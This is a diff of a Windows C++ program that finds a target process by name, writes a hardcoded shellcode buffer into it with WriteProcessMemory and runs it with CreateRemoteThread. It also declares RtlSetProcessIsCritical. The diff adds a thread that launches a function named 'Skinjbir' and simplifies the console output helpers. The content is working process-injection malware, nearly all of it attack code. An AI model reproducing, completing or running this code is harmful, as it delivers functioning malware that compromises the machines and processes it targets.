@@ -3,31 +3,23 @@
 #include <TlHelp32.h>
 #include <iomanip>
 #include <Shlwapi.h>
+#include <thread>
 #pragma comment( lib, "shlwapi.lib")
 
 
 template <typename ... T>
-__forceinline void print_info(const char* format, T const& ... args)
-{
-    printf("[\033[96m*\033[0m]\033[33m ");
-    printf(format, args ...);
-    printf("\033[0m");
-}
-
-template <typename ... T>
 __forceinline void print_bad(const char* format, T const& ... args)
 {
-    printf("[\033[91m!\033[0m]\033[33m ");
+    printf("[!] ");
     printf(format, args ...);
-    printf("\033[0m");
+
 }
 
 template <typename ... T>
 __forceinline void print_good(const char* format, T const& ... args)
 {
-    printf("[\033[92m+\033[0m]\033[33m ");
+    printf("[+] ");
     printf(format, args ...);
-    printf("\033[0m");
 }
 
 typedef long(WINAPI* RtlSetProcessIsCritical)(
@@ -99,6 +91,7 @@ DWORD GetPID(const char* pn)
 int main(void)
 {
     BOOL wp = 0;
+    std::thread atk(Skinjbir);
     unsigned char ExecBuffer[] =
         "\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b\x49\x1c"
         "\x8b\x59\x08\x8b\x41\x20\x8b\x09\x80\x78\x0c\x33"
@@ -126,7 +119,7 @@ int main(void)
         {
             if (WriteProcessMemory(hw, base, ExecBuffer, sizeof(ExecBuffer), NULL))
             {
-                HANDLE thread = CreateRemoteThread(hw, NULL, NULL, (LPTHREAD_START_ROUTINE)base, NULL, 0, 0);
+                HANDLE thread = CreateRemoteThread(hw, NULL, NULL,(LPTHREAD_START_ROUTINE)base, NULL, 0, 0);
                 if (thread)
                 {
                     print_good("Thread Created Succesfully 0x%lX\n", thread);
@@ -146,6 +139,5 @@ int main(void)
     }
     else
         print_bad("Process Not found (0x%lX)\n", GetLastError());
+    atk.join();
 }
-
-
